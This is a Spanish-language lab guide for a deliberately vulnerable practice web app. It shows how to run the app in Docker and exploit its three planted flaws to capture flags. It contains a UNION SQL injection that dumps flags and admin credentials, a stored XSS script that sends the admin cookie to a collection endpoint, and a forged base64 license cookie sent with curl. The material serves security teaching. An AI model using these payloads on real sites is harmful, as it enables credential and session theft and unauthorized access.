# 🕹️ RetroFlix — Guía de uso y explotación

Guía práctica para **levantar** la app y **explotar** las 3 vulnerabilidades
paso a paso. Todos los comandos fueron probados.

---

## 1. Cómo levantarla

### Opción A — docker-compose (recomendada)

```bash
cd trabajo_integrador
docker compose up --build
```

### Opción B — Docker a secas

```bash
cd trabajo_integrador
docker build -t retroflix .
docker run -p 5000:5000 retroflix
```

La app queda en 👉 **http://localhost:5000**

Para apagarla: `Ctrl+C` y, si usaste compose, `docker compose down`.

> Flags por defecto:
>
> - SQLi → `FLAG{sql1_un10n_r3tr0fl1x_l34k}`
> - XSS → `FLAG{st0r3d_xss_c00k13_st34l3r}`
> - Cripto → `FLAG{b4s364_n0_3s_3ncr1pt4r}`

---

## 2. Explotación

### 🟥 Vuln 1 — SQL Injection (vista `/buscar`)

**Dónde:** el buscador arma la query concatenando el texto sin sanitizar:
`... WHERE title LIKE '%<input>%'`. Devuelve 3 columnas → se puede usar `UNION`.

**Pasos (desde el navegador):**

1. Entrar a http://localhost:5000/buscar
2. Escribir en el campo de búsqueda:

   ```
   ' UNION SELECT flag, name, 'x' FROM secrets-- -
   ```

3. La flag aparece en la tabla de resultados.

**O por línea de comandos:**

➡️ **`FLAG{sql1_un10n_r3tr0fl1x_l34k}`**

**Bonus — robar credenciales del admin:**

```
' UNION SELECT username, password, 'x' FROM users-- -
```

(devuelve `admin / S3rv3rR00m_K3y_2026!`)

---

### 🟧 Vuln 2 — Stored XSS (vista `/reviews`)

**Dónde:** el cuerpo de las reseñas se renderiza sin escapar (`{{ body | safe }}`).
El panel del admin (`/admin`) muestra las mismas reseñas y tiene una cookie
sensible accesible por JavaScript (no es `httpOnly`).

**Pasos:**

1. Entrar a http://localhost:5000/reviews
2. Publicar una reseña con este cuerpo (campo "¿Qué te pareció?"):

   ```html
   <script>
     fetch("/collect?c=" + encodeURIComponent(document.cookie));
   </script>
   ```

   - Película: cualquiera (ej. `Matrix`)
   - Nombre: cualquiera (ej. `h4x0r`)

3. Simular que **el admin abre su panel** (acá vos hacés de víctima):
   abrir http://localhost:5000/admin en el navegador.
   → Al cargar, el script almacenado se ejecuta con la cookie del admin y la
   envía al servidor del atacante.

4. El atacante revisa lo capturado en 👉 http://localhost:5000/collect

➡️ **`FLAG{st0r3d_xss_c00k13_st34l3r}`** (cookie `admin_flag` robada)

> En un escenario real la víctima sería otro usuario/administrador que abre la
> página con tu reseña; acá `/admin` simula ese navegador.

---

### 🟨 Vuln 3 — Falla criptográfica: licencia en base64 (vista `/premium`)

**Dónde:** la cookie `license` parece "protegida", pero **no está cifrada: es
solo base64 de un JSON**. Encoding no es encryption → se puede leer y modificar.

**Pasos (sin instalar nada):**

1. Entrar a http://localhost:5000/premium → te entrega la cookie `license` y la
   página muestra el contenido decodificado:
   `{"user": "guest", "premium": false, "role": "user"}`.

2. Forjar una licencia con `premium: true` (base64 del JSON modificado):

   ```bash
   echo -n '{"user":"guest","premium":true,"role":"user"}' | base64
   # -> eyJ1c2VyIjoiZ3Vlc3QiLCJwcmVtaXVtIjp0cnVlLCJyb2xlIjoidXNlciJ9
   ```

   > También se puede hacer 100% en el navegador: DevTools (F12) → pestaña
   > Application/Storage → Cookies → editar el valor de `license`, o con
   > cualquier decodificador base64 online (ej. CyberChef).

3. Enviar la licencia forjada como cookie `license`:

   ```bash
   curl --cookie "license=eyJ1c2VyIjoiZ3Vlc3QiLCJwcmVtaXVtIjp0cnVlLCJyb2xlIjoidXNlciJ9" \
        http://localhost:5000/premium
   ```

   (o pegar ese valor en la cookie `license` desde DevTools y recargar `/premium`)

➡️ El servidor activa PREMIUM y entrega **`FLAG{b4s364_n0_3s_3ncr1pt4r}`**

---

## 3. Resumen rápido

| #   | Vista                              | Ataque                                                             | Flag   |
| --- | ---------------------------------- | ------------------------------------------------------------------ | ------ |
| 1   | `/buscar`                          | `' UNION SELECT flag,name,'x' FROM secrets-- -`                    | SQLi   |
| 2   | `/reviews` → `/admin` → `/collect` | reseña con `<script>fetch('/collect?c='+document.cookie)</script>` | XSS    |
| 3   | `/premium`                         | decodificar cookie `license` (base64), `premium:true`, recodificar | Cripto |
